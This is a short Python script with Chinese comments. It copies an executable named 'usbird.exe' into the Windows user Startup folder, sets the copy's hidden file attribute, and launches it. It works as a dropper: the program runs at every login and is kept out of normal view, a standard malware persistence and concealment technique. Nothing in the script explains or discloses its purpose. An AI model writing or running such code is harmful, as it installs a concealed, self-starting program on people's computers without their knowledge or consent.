import os
import shutil
import subprocess
import ctypes
from pathlib import Path
import sys
import win32con
import win32file
import win32api

# 获取当前脚本所在路径
script_dir = Path(os.path.dirname(os.path.realpath(__file__)))

# 目标文件路径（自启动文件夹）
startup_folder = Path(os.getenv('APPDATA')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

# 文件名
source_file = script_dir / "usbird.exe"
target_file = startup_folder / "usbird.exe"

# 将文件复制到自启动文件夹
try:
    shutil.copy2(source_file, target_file)
    print(f"文件成功复制到自启动文件夹：{target_file}")
except Exception as e:
    print(f"复制文件失败: {e}")
    sys.exit(1)

# 设置文件为隐藏
try:
    # 使用 win32api 设置文件属性为隐藏
    win32file.SetFileAttributes(str(target_file), win32con.FILE_ATTRIBUTE_HIDDEN)
    print(f"文件设置为隐藏：{target_file}")
except Exception as e:
    print(f"设置文件为隐藏失败: {e}")
    sys.exit(1)

# 启动复制的文件
try:
    subprocess.Popen([str(target_file)])
    print(f"启动文件：{target_file}")
except Exception as e:
    print(f"启动文件失败: {e}")
    sys.exit(1)
